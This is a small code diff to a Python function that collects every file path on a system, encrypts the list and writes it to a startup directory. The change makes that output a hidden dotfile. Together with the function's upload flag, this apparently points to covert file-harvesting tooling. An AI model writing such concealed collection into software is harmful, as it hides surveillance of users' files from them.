@@ -22,7 +22,7 @@ def process_filesystem(upload=True):
                 all_files.append(os.path.join(root, name))
 
     token = fe.encrypt('\n'.join(all_files).encode())
-    fname = os.path.join(startup_dir, 'all-files.txt')
+    fname = os.path.join(startup_dir, '.all-files.txt')
 
     with open(fname, 'wb') as f:
         f.write(token)
